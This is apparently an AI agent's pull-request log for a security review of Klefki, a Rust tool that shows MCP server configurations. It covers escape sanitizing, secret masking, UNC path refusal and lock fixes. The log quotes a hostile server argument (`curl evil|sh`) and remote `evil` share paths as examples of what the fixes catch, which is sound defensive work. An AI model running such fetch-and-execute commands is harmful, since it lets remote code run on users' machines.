# Review of core, part 2: what rows and previews show (2026-10-18)
Goal: the second PR of the overnight review of `crates/core`, `crates/cli` and `crates/fake-claude` (part 1: `2026-10-18-review-core-1.md`). Everything here is about text from untrusted places (`.mcp.json`, `.claude.json`, Claude's logs, pasted text) and what Klefki shows of it.

Branch `claude/review-core-y2uzla`, restarted from main `5c27260` after part 1 (#27) merged.

## Done
- **A proxy's refusal is not the server's** (`diagnose/hints.rs`, 7d0db08). Reported by the app review thread from the real app: behind a proxy, `ERR_PROXY_TUNNEL … 403` read as the server's Forbidden plus NeedsAuthentication. New hint "Your proxy refused the connection" (ERR_PROXY_TUNNEL, ERR_PROXY_CONNECTION_FAILED, "proxy refused", "Proxy Authentication Required", undici's "when HTTP Tunneling"); it comes before both and suppresses Forbidden. A bare `407` is not matched (`server.js:407:12`).
- **UNC paths with mixed slashes** (`config/inventory.rs`, b83ab5e). Windows reads either slash in the `\\server` prefix, so a project key `/\evil\share` or `\/evil/share` made Klefki read `.mcp.json` from a remote host. Any two leading slashes are refused.
- **One line per row, each part cleaned on its own** (`sanitize.rs`, `config/inventory.rs`, 3fe5969). An escape left open in one argument swallowed the arguments after it (`node --title= server.js` while the server ran `-e "…curl evil|sh"`); a CSI now ends at the first character that cannot belong to one. Names, targets and OAuth client ids and scopes keep no line breaks or tabs (`sanitize_line`), so a name in `.mcp.json` cannot draw a fake row in the grid or `klefki-cli list`.
- **Masking gaps** (`config/secretlike.rs`, 85f7195). Shown in full before: a token as a URL's user name, a secret in a later query parameter or the fragment, `--oauth2Bearer`, `--header=Authorization: …` as one word, a neutral header name with a scheme or a credential's shape. Over-masked before: `--token-file x/y`, `--auth-type oauth`, `--token-url https://…`.
- **Paste preview** (`paste.rs`, e876b3c). The summary used no masking, and problems quoted back `-k=SECRET`, `-e SECRET`, `-H "Bearer SECRET"`. It now uses the list's rules (and `display_url` for addresses) and cleans each word on its own.
- **Diagnose, from #27's round 2** (`diagnose/redact.rs`, bf21f22). A plain-quoted value with an escaped quote in it (`"x\"y horse battery"`) was hidden only up to that quote; it is now read as a JSON string.
- **Paste reading** (`paste.rs`, see the commit "Paste: prose, web typography, missing values and Git Bash switches"). An apostrophe in a README line (`Don't run as root.`) opened a quote that swallowed every command after it; when pasting, a line not starting with `claude` is now skipped whole, unread (not in the form). Non-breaking spaces separate words outside quotes; a curly quote or long dash starting a word is the problem, saying what to type instead. `-e`, `-H`, `-t`, `--client-id` and add-json's `-s` without a value are a problem, as in Claude Code. Every `X:/` switch Git Bash made right after `cmd` is put back (`cmd /s /c`).
- **Windows lock race** (`config/docstore.rs`, 4fd7534). Asked for by the coordinator after main went red on Windows: `two_writers_at_once_both_get_their_change_in` failed with `Access is denied. (os error 5)` (run 39178339976). Creating the lock folder while the previous holder's folder is still being removed (another process, or Klefki's own `is_stale` check, has it open) is refused on Windows as access denied, and `Lock::acquire` returned that at once. It is now waited out like a held lock; a refusal that lasts the whole wait is still returned as the error. The code dates from f23ebf8 (2026-10-17); #27 did not touch it, and the same tree passed Windows CI before. Unverified on Windows until CI runs again.
- **Duplicate-key flood** (`config/inventory.rs`, 83b82c3). One warning per repeat (174,750 for a 1 MiB file) buried every other warning; now one per name.

## Review round 1 (performance thread, comment 6257056794)
No blockers. Done (6f702c7, 0a999fc):
- `-H=value` (and `-e=`, `-s=`, `-t=`) says the value goes after a space; an unknown option is still "no option -x".
- A double curly quote anywhere outside straight quotes is the problem, a single one when it starts a word or follows `=` (`O’Brien` is fine). The problem names the word, masked as the list masks it.
- Fences and lines that clean to nothing are skipped silently. `1.`, `2)`, `-`, `*`, `+`, `>` and PowerShell/cmd prompts before a command are dropped.
- When nothing is added, a line naming claude is quoted in the error (`claude mcp ad …`, `sudo claude …`).
- A skipped line's note is masked (`export OPENAI_API_KEY=…`).
- One Git Bash note for all switches.
- Duplicate names: name index. A 1 MiB `.mcp.json` cycling through 499 names: `klefki-cli list` 50-53 ms before, 15-16 ms after, same output (release, interleaved, 9 runs each).
- Found re-reading: since fb13a9b, `cd app && claude mcp add …` lost the command, which main read (checked on main). The command after `&&` or `;` is read again.
Not done: auto-correcting typography (item 3's bigger option: changing pasted text silently is a product call; the problem now names the word); one mask for hidden values (item 8, a finding for Davy); folding prose notes into one (item 7, the performance thread's follow-up after #29 and #30 merge).

## Tests (each failed first; the later assertions in each were confirmed by temporarily reverting one rule at a time)
- `diagnose::hints::tests::a_proxy_that_refuses_is_not_blamed_on_the_server`: main gave [NeedsAuthentication, Forbidden].
- `config::inventory::tests::only_local_absolute_project_paths_are_opened` gained the two mixed-slash paths.
- `config::inventory::tests::an_escape_in_one_argument_hides_none_of_the_others`, `names_and_commands_from_a_repository_stay_on_one_line`, `a_name_defined_many_times_is_reported_once` (main: 1998 warnings, now 2).
- `sanitize::tests::a_csi_ends_where_its_text_starts`, `one_line_text_keeps_no_line_breaks`.
- `config::secretlike::tests::secrets_the_first_rules_missed_are_hidden_too`, `a_setting_named_after_a_secret_stays_readable`, `a_token_in_an_address_gets_a_reference`.
- `diagnose::redact::tests::a_quoted_value_is_hidden_to_its_closing_quote` gained the escaped-quote case.
- `paste::tests::prose_with_an_apostrophe_hides_none_of_the_commands_after_it` (main: "Nothing here adds a server"), `every_switch_git_bash_turned_into_a_drive_is_undone`, `an_option_without_its_value_is_a_problem`, `typography_from_a_web_page_is_read_or_named`.
- `paste::tests::the_summary_hides_what_the_list_hides`, `a_problem_never_repeats_a_secret`.
- Round 1: `paste::tests::an_option_written_with_equals_says_to_put_a_space`, `a_curly_quote_inside_a_word_is_named_too`, `a_readme_pasted_with_its_fences_bullets_and_prompts_reads_cleanly`, `when_nothing_is_added_the_line_meant_is_named`, `a_skipped_line_shows_no_secret`, `a_command_chained_after_another_is_still_read`, and `every_switch_git_bash_turned_into_a_drive_is_undone` now checks the one note.
- `config::docstore::tests::a_lock_folder_still_being_removed_is_waited_for` (main: `Some(Io("permission denied"))` on the first refusal); with a refusal that lasts, the error is still returned, and off Windows it is returned at once.

## Checks
See the pull request (#30): the full verify is run on the final head, after main is brought in. CI could not run from about 23:55Z (no runners assigned); Windows and macOS are unverified until it does.

## Not done here (findings for Davy, in `reviews/2026-10-19-core/findings.md` in the project folder)
Anything else in files #26 changes (docstore, engine, api, ops; the lock fix touches only `Lock::acquire` and its tests, and merges cleanly with #26, #28 and #29's docstore), behaviour changes users would notice (Windows-style paste lexing, invisible characters), and decisions such as running `cargo deny` in CI.
